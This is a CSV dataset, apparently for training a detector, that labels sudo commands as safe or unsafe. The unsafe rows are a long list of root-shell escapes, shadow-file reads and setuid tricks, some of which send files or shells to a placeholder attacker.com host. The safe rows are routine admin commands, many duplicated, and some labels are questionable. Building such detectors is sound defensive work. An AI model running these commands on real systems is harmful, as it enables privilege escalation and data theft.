isSafe,command
0,LFILE=file_to_read sudo readelf -a @$LFILE 
0,sudo red file_to_write a DATA . w q 
0,"LFILE=file_to_read sudo redcarpet ""$LFILE"" "
0,"RHOST=attacker.com RPORT=12345 LFILE=file_or_dir_to_get NAME=backup_name sudo restic backup -r ""rest:http://$RHOST:$RPORT/$NAME"" ""$LFILE"" "
0,LFILE=file_to_read sudo rev $LFILE | rev 
0,sudo rlwrap /bin/sh
0,"sudo rpm --eval '%{lua:os.execute(""/bin/sh"")}'"
0,sudo rpmdb --eval '%(/bin/sh 1>&2)'
0,"sudo rpmquery --eval '%{lua:posix.exec(""/bin/sh"")}'"
0,sudo rpmverify --eval '%(/bin/sh 1>&2)'
0,"sudo rsync -e 'sh -c ""sh 0<&2 1>&2""' 127.0.0.1:/dev/null"
0,"sudo ruby -e 'exec ""/bin/sh""'"
0,sudo run-mailcap --action=view /etc/hosts !/bin/sh 
0,sudo run-parts --new-session --regex '^sh$' /bin
0,TF=$(mktemp) echo '! exec /bin/sh' >$TF sudo runscript $TF 
0,"sudo rview -c ':py import os; os.execl(""/bin/sh"", ""sh"", ""-c"", ""reset; exec sh"")'"
0,"sudo rvim -c ':py import os; os.execl(""/bin/sh"", ""sh"", ""-c"", ""reset; exec sh"")'"
0,sudo sash
0,sudo scanmem shell /bin/sh 
0,"TF=$(mktemp) echo 'sh 0<&2 1>&2' > $TF chmod +x ""$TF"" sudo scp -S $TF x y: "
0,sudo screen
0,sudo script -q /dev/null
0,sudo scrot -e /bin/sh
0,sudo sed -n '1e exec sh 1>&0' /etc/hosts
0,sudo service ../../bin/sh
0,sudo setarch $(arch) /bin/sh
0,LFILE=file_to_change USER=somebody sudo setfacl -m -u:$USER:rwx $LFILE 
0,sudo setlock - /bin/sh
0,HOST=user@attacker.com sudo sftp $HOST !/bin/sh 
0,sudo sg root 
0,"LFILE=file_to_write sudo shuf -e DATA -o ""$LFILE"" "
0,"sudo slsh -e 'system(""/bin/sh"")'"
0,sudo smbclient '\\attacker\share' !/bin/sh 
0,sudo snap install xxxx_1.0_all.snap --dangerous --devmode 
0,sudo socat stdin exec:/bin/sh 
0,"LFILE=file_to_read sudo soelim ""$LFILE"" "
0,sudo softlimit /bin/sh
0,"LFILE=file_to_read sudo sort -m ""$LFILE"" "
0,sudo split --filter=/bin/sh /dev/stdin 
0,sudo sqlite3 /dev/null '.shell /bin/sh'
0,"sudo sqlmap -u 127.0.0.1 --eval=""import os; os.system('/bin/sh')"""
0,LFILE=file_to_read sudo ss -a -F $LFILE 
0,sudo ssh-agent /bin/
0,sudo ssh-keygen -D ./lib.so
0,LFILE=file_to_read sudo ssh-keyscan -f $LFILE 
0,sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
0,sudo sshpass /bin/sh
0,sudo start-stop-daemon -n $RANDOM -S -x /bin/sh
0,sudo stdbuf -i0 /bin/sh
0,sudo strace -o /dev/null /bin/sh
0,"LFILE=file_to_read sudo strings ""$LFILE"" "
0,sudo su
0,sudo sudo /bin/sh
0,"COMMAND='/bin/sh -c id>/tmp/id' sudo sysctl ""kernel.core_pattern=|$COMMAND"" sleep 9999 & kill -QUIT $! cat /tmp/id "
0,TF=$(mktemp) echo /bin/sh >$TF chmod +x $TF sudo SYSTEMD_EDITOR=$TF systemctl edit system.slice 
0,sudo systemd-resolve --status !sh 
0,"LFILE=file_to_read sudo tac -s 'RANDOM' ""$LFILE"" "
0,"LFILE=file_to_read sudo tail -c1G ""$LFILE"" "
0,sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
0,sudo task execute /bin/sh
0,sudo taskset 1 /bin/sh
0,sudo tasksh !/bin/sh 
0,LFILE=file_to_read sudo tbl $LFILE 
0,sudo tclsh exec /bin/sh <@stdin >@stdout 2>@stderr 
0,"COMMAND='id' TF=$(mktemp) echo ""$COMMAND"" > $TF chmod +x $TF sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root "
0,sudo tdbtool ! /bin/sh 
0,"LFILE=file_to_write echo DATA | sudo tee -a ""$LFILE"" "
0,RHOST=attacker.com RPORT=12345 sudo telnet $RHOST $RPORT ^] !/bin/sh 
0,"sudo terraform console file(""file_to_read"") "
0,sudo tex --shell-escape '\write18{/bin/sh}\end' 
0,RHOST=attacker.com sudo tftp $RHOST put file_to_send 
0,"LFILE=file_to_read sudo tic -C ""$LFILE"" "
0,sudo /usr/bin/time /bin/sh
0,sudo timedatectl list-timezones !/bin/sh 
0,sudo timeout --foreground 7d /bin/sh
0,sudo tmate -c /bin/sh
0,sudo tmux
0,echo -e 'pipe\tx\texec /bin/sh 1>&0 2>&0' >>/root/.config/procps/toprc sudo top # press return twice reset 
0,sudo torify /bin/sh
0,sudo torsocks /bin/sh
0,LFILE=file_to_read sudo troff $LFILE 
0,"LFILE=file_to_read sudo ul ""$LFILE"" "
0,"LFILE=file_to_read sudo unexpand -t99999999 ""$LFILE"" "
0,"LFILE=file_to_read sudo uniq ""$LFILE"" "
0,sudo unshare /bin/sh
0,sudo unsquashfs shell ./squashfs-root/sh -p 
0,sudo unzip -K shell.zip ./sh -p 
0,"LFILE=/path/to/file_to_write TF=$(mktemp) echo DATA >$TF sudo update-alternatives --force --install ""$LFILE"" x ""$TF"" 0 "
0,"LFILE=file_to_read sudo uuencode ""$LFILE"" /dev/stdout | uudecode "
0,"LFILE=file_to_read sudo uuencode ""$LFILE"" /dev/stdout | uudecode "
0,"cd $(mktemp -d) echo 'exec ""/bin/sh""' > Vagrantfile vagrant up "
0,sudo valgrind /bin/sh
0,"LFILE=file_to_write sudo varnishncsa -g request -q 'ReqURL ~ ""/xxx""' -F '%{yyy}i' -w ""$LFILE"" "
0,sudo vi -c ':!/bin/sh' /dev/null
0,sudo view -c ':!/bin/sh'
0,sudo vigr
0,sudo vim -c ':!/bin/sh'
0,sudo vimdiff -c ':!/bin/sh'
0,sudo vipw
0,SCRIPT=script_to_run TF=$(mktemp) cat > $TF << EOF <domain type='kvm'>   <name>x</name>   <os>     <type arch='x86_64'>hvm</type>   </os>   <memory unit='KiB'>1</memory>   <devices>     <interface type='ethernet'>       <script path='$SCRIPT'/>     </interface>   </devices> </domain> EOF sudo virsh -c qemu:///system create $TF virsh -c qemu:///system destroy x 
0,"LFILE=file_to_read sudo w3m ""$LFILE"" -dump "
0,"LFILE=file_to_read sudo wall --nobanner ""$LFILE"" "
0,sudo watch -x sh -c 'reset; exec sh 1>&0 2>&0'
0,"LFILE=file_to_read sudo wc --files0-from ""$LFILE"" "
0,TF=$(mktemp) chmod +x $TF echo -e '#!/bin/sh\n/bin/sh 1>&0' >$TF sudo wget --use-askpass=$TF 0 
0,"LFILE=file_to_read sudo whiptail --textbox --scrolltext ""$LFILE"" 0 0 "
0,"PORT=4444 sudo wireshark -c 1 -i lo -k -f ""udp port $PORT"" & echo 'DATA' | nc -u 127.127.127.127 ""$PORT"" "
0,sudo wish exec /bin/sh <@stdin >@stdout 2>@stderr 
0,sudo xargs -a /dev/null sh
0,sudo xdg-user-dir '}; /bin/sh #' 
0,sudo xdotool exec --sync /bin/sh
0,sudo xelatex '\documentclass{article}\usepackage{verbatim}\begin{document}\verbatiminput{file_to_read}\end{document}' strings article.dvi 
0,sudo xetex --shell-escape '\write18{/bin/sh}\end' 
0,LFILE=file_to_read sudo xmodmap -v $LFILE 
0,LFILE=file_to_read sudo xmore $LFILE 
0,"LFILE=file_to_read sudo xpad -f ""$LFILE"" "
0,"LFILE=file_to_read sudo xxd ""$LFILE"" | xxd -r "
0,"LFILE=file_to_read sudo xz -c ""$LFILE"" | xz -d "
0,sudo yarn exec /bin/sh
0,sudo yash
0,sudo yum localinstall -y x-1.0-1.noarch.rpm 
0,sudo zathura :! /bin/sh -c 'exec /bin/sh 0<&1' 
0,TF=$(mktemp -u) sudo zip $TF /etc/hosts -T -TT 'sh #' sudo rm $TF 
0,sudo zsh
0,"LFILE=file_to_read sudo zsoelim ""$LFILE"" "
0,sudo zypper x 
0,sudo nmap --interactive
0,sudo vim -c '!sh'
0,"sudo awk 'BEGIN {system(""/bin/sh"")}'"
0,sudo bash
0,sudo cp /bin/sh /tmp/sh && sudo chmod +s /tmp/sh && /tmp/sh
0,"sudo python -c 'import os; os.system(""/bin/sh"")'"
0,"sudo perl -e 'exec ""/bin/sh"";'"
0,sudo find . -exec /bin/sh \;
0,sudo less /etc/shadow
0,sudo man -P /bin/sh man
0,sudo ftp
0,sudo env /bin/sh
0,sudo gdb -ex '!sh' -q
0,"sudo ruby -e 'exec ""/bin/sh""'"
0,"sudo lua -e 'os.execute(""/bin/sh"")'"
0,sudo more /etc/shadow
0,"sudo socat tcp-connect:localhost:8080 exec:'/bin/sh',pty,stderr,setsid,sigint,sane"
0,sudo tar -cf /dev/null /dev/null --checkpoint-action=exec=/bin/sh
0,sudo tee /root/file.txt
0,sudo vi -c ':!/bin/sh'
0,sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh
0,sudo zip myarchive.zip /etc/shadow -T -TT '/bin/sh'
0,sudo base64 /dev/urandom > /dev/shm/outfile
0,sudo xxd /etc/shadow
0,sudo mysql -e 'system /bin/sh'
0,"sudo tshark -i lo -z exec,/bin/sh"
0,sudo git -p help config
0,"sudo php -r 'system(""/bin/sh"");'"
0,"sudo awk 'BEGIN {system(""/bin/bash"")}'"
0,sudo nano /etc/shadow
0,sudo chown root:root /bin/bash
0,sudo chmod u+s /bin/bash
0,sudo apt-get update && sudo apt-get install --reinstall sudo
0,"sudo python3 -c 'import os; os.system(""/bin/sh"")'"
0,sudo gcc exploit.c -o exploit && sudo ./exploit
0,sudo rvim -c ':!/bin/bash'
0,"sudo node -e 'require(""child_process"").spawn(""/bin/sh"", {stdio: [0, 1, 2]})'"
0,sudo ldd /bin/sh
0,sudo rview -c ':!/bin/bash'
0,sudo ncat -e /bin/sh localhost 8080
0,sudo smbclient \\localhost\share -c '!/bin/sh'
0,sudo bash -c 'exec /bin/sh'
0,sudo less -f /etc/shadow
0,sudo more -f /etc/shadow
0,sudo csh -c 'exec /bin/sh'
0,sudo expect -c 'spawn /bin/sh; interact'
1,sudo ls /root
1,sudo cat /etc/passwd
1,sudo systemctl status apache2
1,sudo service ssh restart
1,sudo cp /var/log/syslog /home/user/
1,sudo rm -rf /tmp/*
1,sudo mv /home/user/file.txt /root/
1,sudo chmod 644 /var/www/html/index.html
1,sudo chown user:user /var/www/html/index.html
1,sudo apt-get update
1,sudo apt-get upgrade
1,sudo yum install httpd
1,sudo dnf remove nginx
1,sudo adduser newuser
1,sudo passwd newuser
1,sudo visudo
1,sudo iptables -L
1,sudo ifconfig eth0 up
1,sudo df -h
1,sudo du -sh /var/log
1,sudo tar -czvf backup.tar.gz /home/user/
1,sudo unzip archive.zip -d /opt/
1,sudo kill -9 12345
1,sudo pkill -f apache2
1,sudo mount /dev/sdb1 /mnt/usb
1,sudo umount /mnt/usb
1,sudo whoami
1,sudo hostnamectl set-hostname newhostname
1,sudo timedatectl set-timezone Europe/Paris
1,sudo journalctl -xe
1,sudo tail -f /var/log/syslog
1,sudo echo 'PermitRootLogin no' >> /etc/ssh/sshd_config
1,sudo ssh-keygen -t rsa -b 4096
1,sudo ufw enable
1,sudo ufw allow 22
1,sudo ufw deny 80
1,sudo lsof -i :80
1,sudo netstat -tuln
1,sudo ip addr show
1,sudo rsync -avz /home/user/ /backup/user/
1,sudo scp /home/user/file.txt user@remote:/path/
1,sudo traceroute google.com
1,sudo ping -c 4 8.8.8.8
1,sudo curl https://example.com
1,sudo wget http://example.com/file.zip
1,sudo systemctl restart nginx
1,sudo systemctl stop mysql
1,sudo systemctl start docker
1,sudo find /var/www/ -type f -name "*.html"
1,sudo grep "error" /var/log/syslog
1,sudo awk '{print $1}' /var/log/syslog
1,sudo sed -i 's/AllowOverride None/AllowOverride All/g' /etc/apache2/apache2.conf
1,sudo touch /var/www/html/newfile.html
1,sudo mkdir /opt/newdir
1,sudo rmdir /opt/olddir
1,sudo ln -s /var/www/html /home/user/html_link
1,sudo df -i
1,sudo fdisk -l
1,sudo blkid /dev/sda1
1,sudo mkfs.ext4 /dev/sdb1
1,sudo fsck /dev/sdb1
1,sudo partprobe /dev/sdb
1,sudo tune2fs -l /dev/sda1
1,sudo systemctl list-units --type=service
1,sudo systemctl enable apache2
1,sudo systemctl disable apache2
1,sudo systemctl reload apache2
1,sudo systemctl daemon-reload
1,sudo service mysql start
1,sudo service mysql stop
1,sudo service mysql restart
1,sudo service mysql status
1,sudo service apache2 reload
1,sudo apt-get install curl
1,sudo apt-get remove curl
1,sudo apt-get install vim
1,sudo apt-cache search nginx
1,sudo dnf update
1,sudo dnf autoremove
1,sudo dnf search docker
1,sudo yum update -y
1,sudo yum search httpd
1,sudo yum autoremove -y
1,sudo chmod 755 /usr/local/bin/myscript.sh
1,sudo chown root:root /usr/local/bin/myscript.sh
1,sudo stat /etc/passwd
1,sudo lsof /var/log/syslog
1,sudo du -a /home/user/
1,sudo df -T
1,sudo tcpdump -i eth0
1,sudo ip route show
1,sudo ip link set dev eth0 up
1,sudo iptables -A INPUT -p tcp --dport 22 -j ACCEPT
1,sudo iptables -A INPUT -p tcp --dport 80 -j ACCEPT
1,sudo iptables-save > /etc/iptables/rules.v4
1,sudo iptables-restore < /etc/iptables/rules.v4
1,sudo route -n
1,sudo sysctl -p
1,sudo lsblk
1,sudo hdparm -i /dev/sda
1,sudo fdisk /dev/sda
1,sudo dd if=/dev/sda of=/dev/null bs=512
1,sudo fuser -m /mnt/usb
1,sudo umask 022
1,sudo sync
1,sudo swapon /dev/sda1
1,sudo swapoff /dev/sda1
1,sudo mkswap /dev/sda1
1,sudo dmidecode -t memory
1,sudo lshw -short
1,sudo smartctl -a /dev/sda
1,sudo iotop
1,sudo iostat -xz 1
1,sudo nmap -sP 192.168.1.0/24
1,sudo ip neigh show
1,sudo arp -a
1,sudo ss -tuln
1,sudo ethtool eth0
1,sudo mtr google.com
1,sudo iwconfig
1,sudo modprobe nf_conntrack
1,sudo lsmod
1,sudo rmmod nf_conntrack
1,sudo modinfo nf_conntrack
1,sudo uname -a
1,sudo dmesg | tail
1,sudo journalctl -b
1,sudo systemctl isolate multi-user.target
1,sudo systemctl set-default graphical.target
1,sudo service ntp restart
1,sudo timedatectl status
1,sudo hwclock --systohc
1,sudo lsof -u username
1,sudo lsof /var/log
1,sudo strace -c ls
1,sudo gdb --batch -ex "run" -ex "bt" --args /usr/bin/command
1,sudo vmstat 5
1,sudo watch -n 1 df -h
1,sudo top
1,sudo htop
1,sudo free -m
1,sudo uptime
1,sudo shutdown -h now
1,sudo reboot
1,sudo cp /etc/hosts /backup/
1,sudo mv /backup/hosts /etc/
1,sudo ln -s /backup/hosts /etc/hosts
1,sudo touch /home/user/newfile.txt
1,sudo echo "127.0.0.1 localhost" >> /etc/hosts
1,sudo lsblk
1,sudo hdparm -i /dev/sda
1,sudo fdisk /dev/sda
1,sudo dd if=/dev/sda of=/dev/null bs=512
1,sudo fuser -m /mnt/usb
1,sudo umask 022
1,sudo sync
1,sudo swapon /dev/sda1
1,sudo swapoff /dev/sda1
1,sudo mkswap /dev/sda1
1,sudo dmidecode -t memory
1,sudo lshw -short
1,sudo smartctl -a /dev/sda
1,sudo iotop
1,sudo iostat -xz 1
1,sudo nmap -sP 192.168.1.0/24
1,sudo ip neigh show
1,sudo arp -a
1,sudo ss -tuln
1,sudo ethtool eth0
1,sudo mtr google.com
1,sudo iwconfig
1,sudo modprobe nf_conntrack
1,sudo lsmod
1,sudo rmmod nf_conntrack
1,sudo modinfo nf_conntrack
1,sudo uname -a
1,sudo dmesg | tail
1,sudo journalctl -b
1,sudo systemctl isolate multi-user.target
1,sudo systemctl set-default graphical.target
1,sudo service ntp restart
1,sudo timedatectl status
1,sudo hwclock --systohc
1,sudo lsof -u username
1,sudo lsof /var/log
1,sudo strace -c ls
1,sudo gdb --batch -ex "run" -ex "bt" --args /usr/bin/command
1,sudo vmstat 5
1,sudo watch -n 1 df -h
1,sudo top
1,sudo htop
1,sudo free -m
1,sudo uptime
1,sudo shutdown -h now
1,sudo reboot
1,sudo cp /etc/hosts /backup/
1,sudo mv /backup/hosts /etc/
1,sudo ln -s /backup/hosts /etc/hosts
1,sudo touch /home/user/newfile.txt
1,sudo echo "127.0.0.1 localhost" >> /etc/hosts

